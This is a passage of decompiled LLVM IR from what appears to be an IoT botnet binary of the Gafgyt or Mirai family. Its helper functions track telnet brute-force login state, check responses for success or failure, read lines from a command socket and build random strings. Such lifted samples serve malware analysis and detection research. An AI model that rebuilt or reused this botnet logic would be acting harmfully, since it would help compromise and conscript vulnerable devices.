  %v5_8048ef8 = add i32 %v4_8048efb, 1
  %v22_8048ef8 = inttoptr i32 %v5_8048ef8 to i8*
  br label %dec_label_pc_8048efb

dec_label_pc_8048efb:                             ; preds = %dec_label_pc_8048eea, %dec_label_pc_8048ef8
  %storemerge4 = phi i8* [ %v22_8048ef8, %dec_label_pc_8048ef8 ], [ %tmp35, %dec_label_pc_8048eea ]
  %v4_8048efb = ptrtoint i8* %storemerge4 to i32
  %v2_8048efe = load i8, i8* %storemerge4, align 1
  %v7_8048f00 = icmp eq i8 %v2_8048efe, 32
  br i1 %v7_8048f00, label %dec_label_pc_8048ef8, label %dec_label_pc_8048f04

dec_label_pc_8048f04:                             ; preds = %dec_label_pc_8048efb
  %v2_8048f07 = load i8, i8* %storemerge4, align 1
  %v10_8048f09 = icmp eq i8 %v2_8048f07, 9
  br i1 %v10_8048f09, label %dec_label_pc_8048ef8, label %dec_label_pc_8048f0d

dec_label_pc_8048f0d:                             ; preds = %dec_label_pc_8048f04
  %v2_8048f10 = load i8, i8* %storemerge4, align 1
  %v10_8048f12 = icmp eq i8 %v2_8048f10, 58
  br i1 %v10_8048f12, label %dec_label_pc_8048ef8, label %dec_label_pc_8048f3d

dec_label_pc_8048f18:                             ; preds = %dec_label_pc_8048f65, %dec_label_pc_8048f3d
  %v3_8048f2f = call i32 @_strlen(i8* %storemerge4)
  %v6_8048f36 = add i32 %v4_8048efb, %v3_8048f2f
  %v1_8048f39 = add i32 %v6_8048f36, -1
  %v1_8048f3a = inttoptr i32 %v1_8048f39 to i8*
  store i8 0, i8* %v1_8048f3a, align 1
  br label %dec_label_pc_8048f3d

dec_label_pc_8048f3d:                             ; preds = %dec_label_pc_8048f0d, %dec_label_pc_8048f18
  %v3_8048f54 = call i32 @_strlen(i8* %storemerge4)
  %v6_8048f5b = add i32 %v4_8048efb, %v3_8048f54
  %v1_8048f5e = add i32 %v6_8048f5b, -1
  %v1_8048f5f = inttoptr i32 %v1_8048f5e to i8*
  %v2_8048f5f = load i8, i8* %v1_8048f5f, align 1
  %v10_8048f61 = icmp eq i8 %v2_8048f5f, 13
  br i1 %v10_8048f61, label %dec_label_pc_8048f18, label %dec_label_pc_8048f65

dec_label_pc_8048f65:                             ; preds = %dec_label_pc_8048f3d
  store i1 false, i1* @df, align 1
  store i32 %v4_8048efb, i32* @edi, align 4
  %v3_8048f7c = call i32 @_strlen(i8* %storemerge4)
  %v6_8048f83 = add i32 %v4_8048efb, %v3_8048f7c
  %v1_8048f86 = add i32 %v6_8048f83, -1
  %v1_8048f87 = inttoptr i32 %v1_8048f86 to i8*
  %v2_8048f87 = load i8, i8* %v1_8048f87, align 1
  %v10_8048f89 = icmp eq i8 %v2_8048f87, 10
  br i1 %v10_8048f89, label %dec_label_pc_8048f18, label %dec_label_pc_8048f8d

dec_label_pc_8048f8d:                             ; preds = %dec_label_pc_8048f65
  %v5_8048f96 = call i32 @__GI_strchr(i8* %storemerge4, i32 46)
  %v1_8048f9e = icmp eq i32 %v5_8048f96, 0
  br i1 %v1_8048f9e, label %dec_label_pc_8048fb6, label %dec_label_pc_8048fa2

dec_label_pc_8048fa2:                             ; preds = %dec_label_pc_8048f8d
  %v5_8048fab = call i32 @__GI_strchr(i8* %storemerge4, i32 46)
  %v6_8048fab = inttoptr i32 %v5_8048fab to i8*
  store i8 0, i8* %v6_8048fab, align 1
  br label %dec_label_pc_8048fb6

dec_label_pc_8048fb6:                             ; preds = %dec_label_pc_8048f8d, %dec_label_pc_8048fa2
  store i32 %v4_8048efb, i32* @eax, align 4
  %v5_8048fc0 = inttoptr i32 %arg1 to i8*
  %v5_8048fc1 = call i32 @strcpy(i8* %v5_8048fc0, i32 %v4_8048efb)
  %v2_8048fcf = call i32 @__libc_close(i32 %v5_8048ea1)
  br label %dec_label_pc_8049039

dec_label_pc_8048fe3:                             ; preds = %dec_label_pc_8048eb1
  %v6_8048ff7 = call i32 @__GI_memset(i8* %tmp34, i32 0, i32 4096)
  %v5_8049011 = call i32 @fdgets(i32 %v2_8048fff, i32 4096, i32 %v5_8048ea1)
  %v1_8049019 = icmp eq i32 %v5_8049011, 0
  %v1_804901b = icmp eq i1 %v1_8049019, false
  br i1 %v1_804901b, label %dec_label_pc_8048eb1, label %dec_label_pc_8049021

dec_label_pc_8049021:                             ; preds = %dec_label_pc_8048fe3, %entry
  %v2_8049027 = call i32 @__libc_close(i32 %v5_8048ea1)
  br label %dec_label_pc_8049039

dec_label_pc_8049039:                             ; preds = %dec_label_pc_8048fb6, %dec_label_pc_8049021
  %storemerge = phi i32 [ 1, %dec_label_pc_8049021 ], [ 0, %dec_label_pc_8048fb6 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8048efb, { 3, 4, 1, 5, 2, 0, 6 }
  uselistorder i8* %storemerge4, { 0, 1, 2, 4, 3, 5, 6, 8, 7 }
  uselistorder i32 %v2_8048fff, { 3, 1, 2, 0 }
  uselistorder i32 %v5_8048ea1, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8049039, { 1, 0 }
  uselistorder label %dec_label_pc_8048fb6, { 1, 0 }
  uselistorder label %dec_label_pc_8048f3d, { 1, 0 }
  uselistorder label %dec_label_pc_8048efb, { 1, 0 }
  uselistorder label %dec_label_pc_8048eb1, { 1, 0 }
}

define i32 @getCores() local_unnamed_addr {
entry:
  %stack_var_-4108 = alloca i32, align 4
  %v5_804905e = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8057140.18, i32 0, i32 0), i32 0)
  %v2_80490bf = ptrtoint i32* %stack_var_-4108 to i32
  %tmp16 = bitcast i32* %stack_var_-4108 to i8*
  %v5_80490d117 = call i32 @fdgets(i32 %v2_80490bf, i32 4096, i32 %v5_804905e)
  %v1_80490d918 = icmp eq i32 %v5_80490d117, 0
  %v1_80490db19 = icmp eq i1 %v1_80490d918, false
  br i1 %v1_80490db19, label %dec_label_pc_804906b.lr.ph, label %dec_label_pc_80490dd

dec_label_pc_804906b.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804906b

dec_label_pc_804906b:                             ; preds = %dec_label_pc_804906b.lr.ph, %dec_label_pc_804906b
  %stack_var_-12.120 = phi i32 [ 0, %dec_label_pc_804906b.lr.ph ], [ %stack_var_-12.0, %dec_label_pc_804906b ]
  %v3_8049075 = call i32 @uppercase(i8* %tmp16)
  %v5_804908c = call i32 @strstr(i32 %v2_80490bf, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805714e.19, i32 0, i32 0))
  %v12_804909c = icmp eq i32 %v5_804908c, %v2_80490bf
  %v4_80490a0 = zext i1 %v12_804909c to i32
  %stack_var_-12.0 = add i32 %stack_var_-12.120, %v4_80490a0
  %v6_80490b7 = call i32 @__GI_memset(i8* %tmp16, i32 0, i32 4096)
  %v5_80490d1 = call i32 @fdgets(i32 %v2_80490bf, i32 4096, i32 %v5_804905e)
  %v1_80490d9 = icmp eq i32 %v5_80490d1, 0
  %v1_80490db = icmp eq i1 %v1_80490d9, false
  br i1 %v1_80490db, label %dec_label_pc_804906b, label %dec_label_pc_80490dd

dec_label_pc_80490dd:                             ; preds = %dec_label_pc_804906b, %entry
  %stack_var_-12.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-12.0, %dec_label_pc_804906b ]
  %v2_80490e3 = call i32 @__libc_close(i32 %v5_804905e)
  ret i32 %stack_var_-12.1.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-12.0, { 1, 0 }
  uselistorder i32 %v2_80490bf, { 3, 1, 2, 0 }
  uselistorder i32 %v5_804905e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804906b, { 1, 0 }
}

define i32 @makeRandomStr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80490f0 = load i32, i32* @ebp, align 4
  store i32 %v0_80490f0, i32* %stack_var_-4, align 4
  %v0_80490f4 = load i32, i32* @ebx, align 4
  store i32 %v0_80490f4, i32* %stack_var_-12, align 4
  %v5_804910d = ptrtoint i8* %arg1 to i32
  %v5_804914e21 = icmp sgt i32 %arg2, 0
  br i1 %v5_804914e21, label %dec_label_pc_8049108, label %dec_label_pc_8049150

dec_label_pc_8049108:                             ; preds = %entry, %dec_label_pc_8049108
  %storemerge22 = phi i32 [ %v4_8049145, %dec_label_pc_8049108 ], [ 0, %entry ]
  %v6_804910d = add i32 %storemerge22, %v5_804910d
  store i32 %v6_804910d, i32* @ebx, align 4
  %v1_8049110 = call i32 @rand_cmwc(i32 %storemerge22)
  store i32 %v1_8049110, i32* @ecx, align 4
  %v2_8049120 = udiv i32 %v1_8049110, 26
  %tmp = mul i32 %v2_8049120, -10
  %v2_8049138 = add i32 %v1_8049110, %tmp
  %v1_8049140 = add i32 %v2_8049138, 65
  %v11_8049140 = trunc i32 %v1_8049140 to i8
  %v2_8049143 = load i32, i32* @ebx, align 4
  %v3_8049143 = inttoptr i32 %v2_8049143 to i8*
  store i8 %v11_8049140, i8* %v3_8049143, align 1
  %v4_8049145 = add nuw nsw i32 %storemerge22, 1
  %exitcond = icmp eq i32 %v4_8049145, %arg2
  br i1 %exitcond, label %dec_label_pc_8049148.dec_label_pc_8049150_crit_edge, label %dec_label_pc_8049108

dec_label_pc_8049148.dec_label_pc_8049150_crit_edge: ; preds = %dec_label_pc_8049108
  %v2_8049153.pre = load i32, i32* %stack_var_-12, align 4
  %v2_8049155.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049150

dec_label_pc_8049150:                             ; preds = %dec_label_pc_8049148.dec_label_pc_8049150_crit_edge, %entry
  %v2_8049155 = phi i32 [ %v2_8049155.pre, %dec_label_pc_8049148.dec_label_pc_8049150_crit_edge ], [ %v0_80490f0, %entry ]
  %v2_8049153 = phi i32 [ %v2_8049153.pre, %dec_label_pc_8049148.dec_label_pc_8049150_crit_edge ], [ %v0_80490f4, %entry ]
  %storemerge.lcssa = phi i32 [ %arg2, %dec_label_pc_8049148.dec_label_pc_8049150_crit_edge ], [ 0, %entry ]
  store i32 %v2_8049153, i32* @ebx, align 4
  store i32 %v2_8049155, i32* @ebp, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_8049145, { 1, 0 }
  uselistorder i32 %storemerge22, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049108, { 1, 0 }
}

define i32 @recvLine() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp15 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-177 = alloca i8, align 1
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804915a = load i32, i32* @edi, align 4
  store i32 %v0_804915a, i32* %stack_var_-8, align 4
  %v1_8049167 = inttoptr i32 %tmp19 to i8*
  %v1_804916c = and i32 %tmp19, -256
  store i32 %v1_804916c, i32* %eax.global-to-local, align 4
  %v5_804916e = call i8* @_memset(i8* %v1_8049167, i32 %v1_804916c, i32 %tmp20)
  store i32 30, i32* %stack_var_-176, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804918e = ptrtoint i32* %stack_var_-168 to i32
  %tmp36 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_804918e, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049195 = call i8* @_memset(i8* %tmp36, i32 0, i32 32)
  %v2_80491a2 = udiv i32 %tmp15, 32
  %v1_80491a8 = urem i32 %tmp15, 32
  store i32 %v1_80491a8, i32* %eax.global-to-local, align 4
  %v0_80491ab = load i32, i32* @ebp, align 4
  %v2_80491ab = mul nuw nsw i32 %v2_80491a2, 4
  %v3_80491ab = add nsw i32 %v2_80491ab, -164
  %v4_80491ab = add i32 %v3_80491ab, %v0_80491ab
  %v5_80491ab = inttoptr i32 %v4_80491ab to i32*
  %v6_80491ab = load i32, i32* %v5_80491ab, align 4
  %v9_80491ab = shl i32 1, %v1_80491a8
  %v12_80491ab = or i32 %v6_80491ab, %v9_80491ab
  store i32 %v12_80491ab, i32* %v5_80491ab, align 4
  %v1_80491b6 = add i32 %tmp15, 1
  %v2_80491ba = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_804918e, i32* %eax.global-to-local, align 4
  %v5_80491d2 = call i32 @__libc_select(i32 %v1_80491b6, i32 %v2_804918e, i32 0, i32 %v2_804918e, i32 %v2_80491ba)
  store i32 %v5_80491d2, i32* %eax.global-to-local, align 4
  %tmp37 = icmp slt i32 %v5_80491d2, 1
  %tmp38 = icmp eq i1 %tmp37, false
  br i1 %tmp38, label %dec_label_pc_8049282, label %dec_label_pc_8049278.preheader

dec_label_pc_8049278.preheader:                   ; preds = %entry
  %v7_804927c45 = icmp sgt i32 %tmp11, 9
  br i1 %v7_804927c45, label %dec_label_pc_8049282, label %dec_label_pc_80491ec.lr.ph

dec_label_pc_80491ec.lr.ph:                       ; preds = %dec_label_pc_8049278.preheader
  br label %dec_label_pc_80491ec

dec_label_pc_80491ec:                             ; preds = %dec_label_pc_80491ec.lr.ph, %dec_label_pc_8049275
  %stack_var_-36.046 = phi i32 [ %tmp11, %dec_label_pc_80491ec.lr.ph ], [ %v4_8049275, %dec_label_pc_8049275 ]
  %v0_80491ec = load i32, i32* @global_var_8061580.20, align 128
  store i32 %v0_80491ec, i32* %eax.global-to-local, align 4
  %v3_80491fa = call i32 @sockprintf(i32 %v0_80491ec, i32 ptrtoint ([5 x i8]* @global_var_8057157.21 to i32))
  store i32 30, i32* %stack_var_-176, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804918e, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049227 = call i8* @_memset(i8* %tmp36, i32 0, i32 32)
  store i32 %v1_80491a8, i32* %eax.global-to-local, align 4
  %v0_804923d = load i32, i32* @ebp, align 4
  %v4_804923d = add i32 %v3_80491ab, %v0_804923d
  %v5_804923d = inttoptr i32 %v4_804923d to i32*
  %v6_804923d = load i32, i32* %v5_804923d, align 4
  %v12_804923d = or i32 %v6_804923d, %v9_80491ab
  store i32 %v12_804923d, i32* %v5_804923d, align 4
  store i32 %v2_804918e, i32* %eax.global-to-local, align 4
  %v5_8049264 = call i32 @__libc_select(i32 %v1_80491b6, i32 %v2_804918e, i32 0, i32 %v2_804918e, i32 %v2_80491ba)
  store i32 %v5_8049264, i32* %eax.global-to-local, align 4
  %tmp39 = icmp slt i32 %v5_8049264, 1
  %tmp40 = icmp eq i1 %tmp39, false
  br i1 %tmp40, label %dec_label_pc_8049282, label %dec_label_pc_8049275

dec_label_pc_8049275:                             ; preds = %dec_label_pc_80491ec
  %v4_8049275 = add nsw i32 %stack_var_-36.046, 1
  %v7_804927c = icmp sgt i32 %stack_var_-36.046, 8
  br i1 %v7_804927c, label %dec_label_pc_8049282, label %dec_label_pc_80491ec

dec_label_pc_8049282:                             ; preds = %dec_label_pc_8049278.preheader, %dec_label_pc_80491ec, %dec_label_pc_8049275, %entry
  store i32 %tmp19, i32* %eax.global-to-local, align 4
  %v2_804929a = ptrtoint i8* %stack_var_-177 to i32
  br label %dec_label_pc_80492dc

dec_label_pc_8049291:                             ; preds = %dec_label_pc_80492dc
  %v0_8049291 = load i32, i32* @global_var_8061580.20, align 128
  store i32 %v0_8049291, i32* %eax.global-to-local, align 4
  %v5_80492a2 = call i32 @__libc_recv(i32 %v0_8049291, i32 %v2_804929a, i32 1, i32 0)
  store i32 %v5_80492a2, i32* %eax.global-to-local, align 4
  %v9_80492aa = icmp eq i32 %v5_80492a2, 1
  br i1 %v9_80492aa, label %dec_label_pc_80492c1, label %dec_label_pc_80492af

dec_label_pc_80492af:                             ; preds = %dec_label_pc_8049291
  %v4_80492af = ptrtoint i8* %stack_var_-32.0 to i32
  store i32 %v4_80492af, i32* %eax.global-to-local, align 4
  store i8 0, i8* %stack_var_-32.0, align 1
  br label %dec_label_pc_80492f9

dec_label_pc_80492c1:                             ; preds = %dec_label_pc_8049291
  %v3_80492c1 = load i8, i8* %stack_var_-177, align 1
  %v4_80492c1 = sext i8 %v3_80492c1 to i32
  store i32 %v4_80492c1, i32* %eax.global-to-local, align 4
  %v4_80492c7 = ptrtoint i8* %stack_var_-32.0 to i32
  store i8 %v3_80492c1, i8* %stack_var_-32.0, align 1
  %v5_80492cc = add i32 %v4_80492c7, 1
  %v22_80492cc = inttoptr i32 %v5_80492cc to i8*
  %v3_80492cf = load i8, i8* %stack_var_-177, align 1
  %v4_80492cf = sext i8 %v3_80492cf to i32
  %v6_80492cf = load i32, i32* %eax.global-to-local, align 4
  %v7_80492cf = and i32 %v6_80492cf, -256
  %v8_80492cf = or i32 %v7_80492cf, %v4_80492cf
  store i32 %v8_80492cf, i32* %eax.global-to-local, align 4
  %v10_80492d5 = icmp eq i8 %v3_80492cf, 10
  br i1 %v10_80492d5, label %dec_label_pc_80492ea, label %dec_label_pc_80492d9

dec_label_pc_80492d9:                             ; preds = %dec_label_pc_80492c1
  %v4_80492d9 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_80492dc

dec_label_pc_80492dc:                             ; preds = %dec_label_pc_8049282, %dec_label_pc_80492d9
  %v7_80492e0 = phi i32 [ %tmp19, %dec_label_pc_8049282 ], [ %v8_80492cf, %dec_label_pc_80492d9 ]
  %stack_var_-32.0 = phi i8* [ %v1_8049167, %dec_label_pc_8049282 ], [ %v22_80492cc, %dec_label_pc_80492d9 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_8049282 ], [ %v4_80492d9, %dec_label_pc_80492d9 ]
  %stack_var_12.0 = phi i32 [ %tmp20, %dec_label_pc_8049282 ], [ %v4_80492dc, %dec_label_pc_80492d9 ]
  %v4_80492dc = add i32 %stack_var_12.0, -1
  %v9_80492dc = sub i32 0, %stack_var_12.0
  %v10_80492dc = and i32 %stack_var_12.0, %v9_80492dc
  %v11_80492dc = icmp slt i32 %v10_80492dc, 0
  %v12_80492dc = icmp eq i32 %v4_80492dc, 0
  %v13_80492dc = icmp slt i32 %v4_80492dc, 0
  %v3_80492e0 = icmp eq i1 %v13_80492dc, %v11_80492dc
  %v4_80492e0 = icmp eq i1 %v12_80492dc, false
  %v5_80492e0 = and i1 %v4_80492e0, %v3_80492e0
  %v6_80492e0 = zext i1 %v5_80492e0 to i32
  %v8_80492e0 = and i32 %v7_80492e0, -256
  %v9_80492e0 = or i32 %v6_80492e0, %v8_80492e0
  store i32 %v9_80492e0, i32* %eax.global-to-local, align 4
  %v4_80492e6 = icmp eq i1 %v5_80492e0, false
  %v1_80492e8 = icmp eq i1 %v4_80492e6, false
  br i1 %v1_80492e8, label %dec_label_pc_8049291, label %dec_label_pc_80492ea

dec_label_pc_80492ea:                             ; preds = %dec_label_pc_80492c1, %dec_label_pc_80492dc
  %stack_var_-32.1 = phi i8* [ %v22_80492cc, %dec_label_pc_80492c1 ], [ %stack_var_-32.0, %dec_label_pc_80492dc ]
  store i8 0, i8* %stack_var_-32.1, align 1
  store i32 %stack_var_-28.0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80492f9

dec_label_pc_80492f9:                             ; preds = %dec_label_pc_80492af, %dec_label_pc_80492ea
  %storemerge = phi i32 [ -1, %dec_label_pc_80492af ], [ %stack_var_-28.0, %dec_label_pc_80492ea ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v3_80492ff = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_80492ff, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_80492dc, { 2, 1, 0 }
  uselistorder i32 %stack_var_12.0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-28.0, { 1, 0, 2 }
  uselistorder i8* %stack_var_-32.0, { 2, 0, 1, 3, 4 }
  uselistorder i8* %v22_80492cc, { 1, 0 }
  uselistorder i32 %v1_80491a8, { 2, 1, 0 }
  uselistorder i32 %v2_804918e, { 0, 3, 4, 5, 1, 2, 6, 7 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i8* %stack_var_-177, { 2, 1, 0 }
  uselistorder i32 %tmp20, { 1, 0 }
  uselistorder i32 %tmp19, { 0, 3, 1, 2 }
  uselistorder i32 %tmp15, { 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 8, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 19, 14, 15, 16, 17, 18 }
  uselistorder label %dec_label_pc_80492f9, { 1, 0 }
  uselistorder label %dec_label_pc_80492ea, { 1, 0 }
  uselistorder label %dec_label_pc_80492dc, { 1, 0 }
  uselistorder label %dec_label_pc_8049282, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_80491ec, { 1, 0 }
}

define i32 @get_telstate_host() local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v1_804930d = add i32 %tmp1, 4
  %v2_804930d = inttoptr i32 %v1_804930d to i32*
  %v3_804930d = load i32, i32* %v2_804930d, align 4
  %v1_8049319 = call i32 @__GI_inet_ntoa(i32 %v3_804930d)
  ret i32 %v1_8049319
}

define i32 @read_until_response(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8049326 = load i32, i32* @edi, align 4
  store i32 %v0_8049326, i32* %stack_var_-8, align 4
  %v1_8049330 = inttoptr i32 %tmp4 to i8*
  store i32 %tmp4, i32* @edi, align 4
  %v1_8049335 = and i32 %tmp4, -256
  %v5_8049337 = call i8* @_memset(i8* %v1_8049330, i32 %v1_8049335, i32 %tmp5)
  %v4_8049345 = call i32 @read_with_timeout(i32 %arg1, i32 %tmp3, i32 %tmp4, i32 %tmp5)
  %v2_8049359 = inttoptr i32 %tmp to i32*
  %v3_8049359 = call i32 @contains_string(i32 %tmp4, i32* %v2_8049359)
  %v1_8049361 = icmp ne i32 %v3_8049359, 0
  %storemerge = zext i1 %v1_8049361 to i32
  %v3_8049378 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8049378, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp4, { 4, 0, 1, 3, 2 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  store i32 0, i32* %stack_var_-152, align 4
  %v2_80493a4 = ptrtoint i32* %stack_var_-144 to i32
  %tmp21 = bitcast i32* %stack_var_-144 to i8*
  store i1 false, i1* @df, align 1
  %v5_80493ab = call i8* @_memset(i8* %tmp21, i32 0, i32 32)
  %v2_80493b8 = udiv i32 %arg1, 32
  %v1_80493be = urem i32 %arg1, 32
  %v0_80493c1 = load i32, i32* @ebp, align 4
  %v2_80493c1 = mul nuw nsw i32 %v2_80493b8, 4
  %v3_80493c1 = add nsw i32 %v2_80493c1, -140
  %v4_80493c1 = add i32 %v3_80493c1, %v0_80493c1
  %v5_80493c1 = inttoptr i32 %v4_80493c1 to i32*
  %v6_80493c1 = load i32, i32* %v5_80493c1, align 4
  %v9_80493c1 = shl i32 1, %v1_80493be
  %v12_80493c1 = or i32 %v6_80493c1, %v9_80493c1
  store i32 %v12_80493c1, i32* %v5_80493c1, align 4
  %v1_80493cc = add i32 %arg1, 1
  %v2_80493d0 = ptrtoint i32* %stack_var_-152 to i32
  %v5_80493e3 = call i32 @__libc_select(i32 %v1_80493cc, i32 %v2_80493a4, i32 0, i32 0, i32 %v2_80493d0)
  %tmp22 = icmp slt i32 %v5_80493e3, 1
  %tmp23 = icmp eq i1 %tmp22, false
  br i1 %tmp23, label %dec_label_pc_80493fb, label %dec_label_pc_8049415

dec_label_pc_80493fb:                             ; preds = %entry
  %v4_8049407 = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_8049415

dec_label_pc_8049415:                             ; preds = %entry, %dec_label_pc_80493fb
  %storemerge = phi i32 [ %v4_8049407, %dec_label_pc_80493fb ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8049415, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg1 to i32
  %v4_8049426 = icmp eq i32 %arg2, 0
  %v6_8049426 = trunc i32 %arg2 to i8
  %v1_804942a = icmp eq i1 %v4_8049426, false
  br i1 %v1_804942a, label %entry.dec_label_pc_804943d_crit_edge, label %dec_label_pc_804942c

entry.dec_label_pc_804943d_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804943d

dec_label_pc_804942c:                             ; preds = %entry
  %v2_804942f = load i32, i32* %arg1, align 4
  %v1_8049435 = call i32 @__libc_close(i32 %v2_804942f)
  br label %dec_label_pc_804943d

dec_label_pc_804943d:                             ; preds = %entry.dec_label_pc_804943d_crit_edge, %dec_label_pc_804942c
  %v1_8049440 = add i32 %tmp2, 16
  %v2_8049440 = inttoptr i32 %v1_8049440 to i32*
  store i32 0, i32* %v2_8049440, align 4
  %v3_804944f = add i32 %tmp2, 8
  %v4_804944f = inttoptr i32 %v3_804944f to i8*
  store i8 %v6_8049426, i8* %v4_804944f, align 1
  %v1_8049455 = add i32 %tmp2, 24
  %v2_8049455 = inttoptr i32 %v1_8049455 to i32*
  %v3_8049455 = load i32, i32* %v2_8049455, align 4
  %v3_8049466 = inttoptr i32 %v3_8049455 to i8*
  %v4_8049466 = call i32 @__GI_memset(i8* %v3_8049466, i32 0, i32 1024)
  ret i32 %v4_8049466

; uselistorder directives
  uselistorder i32 %tmp2, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804943d, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1) local_unnamed_addr {
entry:
  %v2_804947e = inttoptr i32 %arg1 to i32*
  %v3_804947e = call i32 @advance_state(i32* %v2_804947e, i32 0)
  %v1_8049489 = add i32 %arg1, 9
  %v2_8049489 = inttoptr i32 %v1_8049489 to i8*
  store i8 1, i8* %v2_8049489, align 1
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v4_80494a0 = call i32 @contains_string(i32 %arg1, i32* bitcast ([3 x i8*]* @global_var_8061220.25 to i32*))
  ret i32 %v4_80494a0
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v4_80494bb = call i32 @contains_string(i32 %arg1, i32* bitcast ([7 x i8*]* @global_var_8061200.33 to i32*))
  ret i32 %v4_80494bb
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %v1_80494d1 = call i32 @contains_success(i32 %arg1)
  %v1_80494d9 = icmp eq i32 %v1_80494d1, 0
  %v1_80494db = icmp eq i1 %v1_80494d9, false
  br i1 %v1_80494db, label %dec_label_pc_80494ff, label %dec_label_pc_80494dd

dec_label_pc_80494dd:                             ; preds = %entry
  %v1_80494e3 = call i32 @contains_fail(i32 %arg1)
  %v1_80494eb = icmp ne i32 %v1_80494e3, 0
  %. = zext i1 %v1_80494eb to i32
  br label %dec_label_pc_80494ff

dec_label_pc_80494ff:                             ; preds = %dec_label_pc_80494dd, %entry
  %storemerge = phi i32 [ 1, %entry ], [ %., %dec_label_pc_80494dd ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_8049504 = load i32, i32* @ebp, align 4
  store i32 %v0_8049504, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804951f

dec_label_pc_804951f:                             ; preds = %dec_label_pc_804951f, %entry
  %stack_var_-12.0 = phi i32 [ 0, %entry ], [ %v4_804951f, %dec_label_pc_804951f ]
  %v4_804951f = add i32 %stack_var_-12.0, 1
  %v2_8049525 = mul i32 %v4_804951f, 4
  %v5_8049528 = add i32 %v2_8049525, %tmp5
  %v1_804952b = inttoptr i32 %v5_8049528 to i32*
  %v2_804952b = load i32, i32* %v1_804952b, align 4
  %v1_804952d = icmp eq i32 %v2_804952b, 0
  %v1_804952f = icmp eq i1 %v1_804952d, false
  br i1 %v1_804952f, label %dec_label_pc_804951f, label %dec_label_pc_8049564.preheader

dec_label_pc_8049564.preheader:                   ; preds = %dec_label_pc_804951f
  %v2_804954c = inttoptr i32 %arg1 to i8*
  %v5_804956a16 = icmp sgt i32 %v4_804951f, 0
  br i1 %v5_804956a16, label %dec_label_pc_804953a.lr.ph, label %dec_label_pc_8049573

dec_label_pc_804953a.lr.ph:                       ; preds = %dec_label_pc_8049564.preheader
  br label %dec_label_pc_804953a

dec_label_pc_804953a:                             ; preds = %dec_label_pc_804953a.lr.ph, %dec_label_pc_8049561
  %storemerge117 = phi i32 [ 0, %dec_label_pc_804953a.lr.ph ], [ %v4_8049561, %dec_label_pc_8049561 ]
  %v2_804953d = mul i32 %storemerge117, 4
